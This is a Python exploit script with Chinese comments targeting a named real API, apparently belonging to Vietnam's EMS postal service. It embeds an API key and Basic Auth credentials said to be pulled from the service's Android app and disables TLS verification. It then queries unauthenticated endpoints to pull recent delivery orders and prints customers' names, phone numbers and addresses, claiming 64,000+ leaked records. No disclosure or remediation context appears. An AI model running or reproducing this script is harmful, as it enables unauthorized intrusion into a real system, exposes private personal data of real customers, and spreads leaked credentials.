#!/usr/bin/env python3
"""
api-dingdong.ems.com.vn 完整利用脚本
未授权信息泄露 + 认证绕过

发现: 2025-10-22
漏洞: 硬编码凭证 + 未授权API访问
影响: 64,000+订单记录泄露
"""

import requests
import base64
import hashlib
import json
from datetime import datetime, timedelta
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ============== 从APK提取的凭证 ==============
PRIVATE_KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
BASE_URL = 'https://api-dingdong.ems.com.vn'
BASIC_AUTH = base64.b64encode(b'lottnet:dms').decode()

headers = {
    'Authorization': f'Basic {BASIC_AUTH}',
    'APIKey': PRIVATE_KEY,
    'Content-Type': 'application/x-www-form-urlencoded'
}

def sha256(text):
    """SHA256签名算法"""
    return hashlib.sha256(text.encode()).hexdigest().upper()

# ============== API函数 ==============

def get_provinces():
    """获取所有越南省份"""
    payload = {'Code': 'DIC001', 'Data': ''}
    r = requests.post(
        f'{BASE_URL}/api/Gateway/Bussiness', 
        json=payload, 
        headers={**headers, 'Content-Type': 'application/json'},
        verify=False, 
        timeout=45
    )
    if r.status_code == 200 and r.json().get('Code') == '00':
        return json.loads(r.json()['Data'])
    return []

def get_districts(province_id):
    """获取指定省份的区县"""
    payload = {'Code': 'DIC002', 'Data': str(province_id)}
    r = requests.post(
        f'{BASE_URL}/api/Gateway/Bussiness',
        json=payload,
        headers={**headers, 'Content-Type': 'application/json'},
        verify=False, 
        timeout=45
    )
    if r.status_code == 200 and r.json().get('Code') == '00':
        return json.loads(r.json()['Data'])
    return []

def get_reasons():
    """获取配送失败原因字典"""
    r = requests.get(
        f'{BASE_URL}/api/Dictionary/GetReasons',
        headers=headers, 
        verify=False, 
        timeout=45
    )
    if r.status_code == 200 and r.json().get('Code') == '00':
        return r.json()['ListValue']
    return []

def search_orders(from_date, to_date, postman_id=''):
    """
    搜索订单（未授权访问）
    
    Args:
        from_date: 开始日期 (YYYY-MM-DD)
        to_date: 结束日期 (YYYY-MM-DD)
        postman_id: 配送员ID（留空返回所有）
    
    Returns:
        订单列表
    """
    data = f'PostmanID={postman_id}&FromDate={from_date}&ToDate={to_date}'
    r = requests.post(
        f'{BASE_URL}/api/Collect/SearchConfirmArrved',
        data=data, 
        headers=headers, 
        verify=False, 
        timeout=120
    )
    if r.status_code == 200 and r.json().get('Code') == '00':
        return r.json()['ListValue']
    return []

def query_parcel(parcel_code):
    """查询包裹详情（需要签名）"""
    signature = sha256(parcel_code.upper() + PRIVATE_KEY)
    data = f'ParcelCode={parcel_code.upper()}&Signature={signature}'
    r = requests.post(
        f'{BASE_URL}/api/Delivery/Inquiry',
        data=data, 
        headers=headers, 
        verify=False, 
        timeout=30
    )
    if r.status_code == 200:
        return r.json()
    return None

# ============== 主函数 ==============

def main():
    print('═══════════════════════════════════════════════════')
    print('  api-dingdong.ems.com.vn 漏洞利用')
    print('═══════════════════════════════════════════════════\n')
    
    print('[+] 认证信息（从APK提取）')
    print(f'    Basic Auth: lottnet:dms')
    print(f'    APIKey: {PRIVATE_KEY[:40]}...\n')
    
    # 1. 获取省份
    print('[1] 获取越南省份列表...')
    provinces = get_provinces()
    print(f'    ✓ {len(provinces)} 个省份\n')
    
    # 2. 获取字典
    print('[2] 获取配送原因字典...')
    reasons = get_reasons()
    print(f'    ✓ {len(reasons)} 个原因代码\n')
    
    # 3. 搜索最近订单（未授权）
    print('[3] 搜索最近3天订单（未授权访问）...')
    today = datetime.now().strftime('%Y-%m-%d')
    three_days_ago = (datetime.now() - timedelta(days=3)).strftime('%Y-%m-%d')
    
    orders = search_orders(three_days_ago, today)
    print(f'    ✓✓✓ 获取 {len(orders):,} 条订单记录！\n')
    
    if len(orders) > 0:
        # 统计
        customers = set()
        phones = set()
        
        for order in orders:
            if order.get('CustomerCode'):
                customers.add(order['CustomerCode'])
            if order.get('ContactPhone'):
                phone = order['ContactPhone'].split(',')[0].strip()
                if phone:
                    phones.add(phone)
        
        print(f'    客户数: {len(customers):,}')
        print(f'    电话数: {len(phones):,}\n')
        
        print('[!] 敏感数据样本（前3条）:')
        for i, order in enumerate(orders[:3], 1):
            print(f'    订单#{i}:')
            print(f'      代码: {order.get("Code", "N/A")}')
            print(f'      客户: {order.get("ContactName", "N/A")}')
            print(f'      电话: {order.get("ContactPhone", "N/A")}')
            addr = order.get("ContactAddress", "N/A")
            print(f'      地址: {addr[:60]}...' if len(addr) > 60 else f'      地址: {addr}')
            print()
    
    print('═══════════════════════════════════════════════════')
    print('  漏洞: 严重未授权信息泄露')
    print('  价值: ⭐⭐⭐⭐⭐ (5/5)')
    print('═══════════════════════════════════════════════════')

if __name__ == '__main__':
    main()
